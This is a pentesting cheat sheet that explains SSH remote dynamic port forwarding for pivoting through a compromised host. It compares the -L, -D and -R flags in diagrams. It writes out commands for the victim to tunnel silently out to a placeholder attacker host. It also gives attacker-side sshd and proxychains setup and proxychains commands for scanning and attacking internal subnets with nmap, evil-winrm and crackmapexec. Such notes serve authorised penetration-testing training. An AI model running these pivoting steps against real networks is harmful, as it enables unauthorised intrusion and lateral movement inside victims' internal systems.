### SSH Remote Dynamic Port Forwarding — Full Breakdown

---

### Syntax

bash

```bash
# Run ON VICTIM
ssh -R [SOCKS_PORT] kali@YOUR_ATTACKER_IP
```

---

### Breaking Down Each Part

```
ssh -R   1080      kali@attacker_ip
          │              │
          │              └── Your kali (SSH server)
          └──────────────── SOCKS5 proxy port that opens on YOUR machine
```

#### Notice — Just like -D, no destination IP or port

```
-L   8080 : 127.0.0.1 : 80   user@victim    ← you run, fixed dest
-R   8080 : 127.0.0.1 : 80   kali@yourip    ← victim runs, fixed dest
-D   1080                     user@victim    ← you run, no fixed dest
-R   1080                     kali@yourip    ← victim runs, no fixed dest
                                                (Remote Dynamic)
```

---

### The KEY Mental Model

```
-D   (Local Dynamic)
     YOU run it
     YOU SSH into victim
     SOCKS proxy opens on your machine
     Victim proxies traffic to its network

-R   (Remote Dynamic)
     VICTIM runs it
     VICTIM SSHes out to you
     SOCKS proxy STILL opens on your machine
     Victim STILL proxies traffic to its network

Same result, different direction of SSH connection
```

---

### When Do You Use It?

```
Same as -R situation:

Victim CANNOT be SSHed into directly
├── Firewall blocks inbound to victim
├── Victim is behind NAT
└── But victim CAN make outbound SSH to you

AND you want full network pivot (not just one port)
└── Use Remote Dynamic instead of plain -R
```

---

### Visual Flow

```
YOUR KALI (SSH Server)           VICTIM                  INTERNAL NETWORK
──────────────────────           ──────────────          ────────────────

                           victim runs:
                           ssh -R 1080 kali@YOUR_IP
                                    │
                                    │ victim initiates
                                    │ SSH outbound
                                    │
◄───────────────────────────────────┘
SSH tunnel established
SOCKS5 proxy opens on
YOUR machine :1080
        │
        │
proxychains nmap                                         192.168.1.20 ◄─┐
-sT 192.168.1.0/24                                       192.168.1.30 ◄─┤
        │                                                192.168.1.40 ◄─┤
        │                                                               │
        └──► SOCKS5 :1080 ──► SSH tunnel ──► victim proxies ───────────┘
                                             to anywhere it
                                             can reach
```

---

### All Four Compared Side by Side

```
┌─────────────────────────────────────────────────────────────────────┐
│  FLAG         WHO RUNS IT    SSH DIRECTION    RESULT ON YOUR KALI   │
├─────────────────────────────────────────────────────────────────────┤
│  -L           You            You → Victim     One port forwarded    │
│  -D           You            You → Victim     SOCKS proxy (dynamic) │
│  -R           Victim         Victim → You     One port forwarded    │
│  -R (dynamic) Victim         Victim → You     SOCKS proxy (dynamic) │
└─────────────────────────────────────────────────────────────────────┘
```

---

### Step by Step Setup

#### Step 1 — Your kali must be SSH server

bash

```bash
sudo systemctl start ssh

# /etc/ssh/sshd_config — make sure this is set
GatewayPorts yes
AllowTcpForwarding yes

sudo systemctl restart ssh
```

#### Step 2 — Victim runs this (you execute on victim shell)

bash

```bash
ssh -R 1080 kali@YOUR_ATTACKER_IP
# or silently with no shell
ssh -R 1080 -N kali@YOUR_ATTACKER_IP
```

#### Step 3 — Configure proxychains on YOUR kali

bash

```bash
# /etc/proxychains.conf
socks5  127.0.0.1  1080
```

#### Step 4 — Use proxychains normally on YOUR kali

bash

```bash
proxychains -q nmap -sT -Pn 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.20 -u admin -p pass
proxychains crackmapexec smb 192.168.1.0/24
proxychains curl http://192.168.1.30
```

---

### Full Mental Map — All Four Flags

```
CAN you SSH into victim?
│
├── YES (you SSH into victim)
│    │
│    ├── ONE service/port needed?
│    │    └── -L  (Local Port Forward)
│    │        ssh -L 8080:127.0.0.1:80 user@victim
│    │        YOU run it
│    │
│    └── WHOLE network needed?
│         └── -D  (Local Dynamic)
│             ssh -D 1080 user@victim
│             YOU run it
│             + proxychains on your kali
│
└── NO (victim SSHes out to you)
     │
     ├── ONE service/port needed?
     │    └── -R  (Remote Port Forward)
     │        ssh -R 8080:127.0.0.1:80 kali@YOUR_IP
     │        VICTIM runs it
     │
     └── WHOLE network needed?
          └── -R Dynamic (Remote Dynamic)
              ssh -R 1080 kali@YOUR_IP
              VICTIM runs it
              + proxychains on your kali
```

---

### One Line Summary For Each

```
-L        "I reach into victim and pull one port to me"
-D        "I reach into victim and make them my full proxy"
-R        "Victim can't be reached, it pushes one port to me"
-R 1080   "Victim can't be reached, it pushes full proxy to me"
```

---

The only real difference between `-D` and Remote Dynamic `-R` is **who initiates the SSH connection** — the result on your kali (SOCKS5 proxy + proxychains) is **identical**.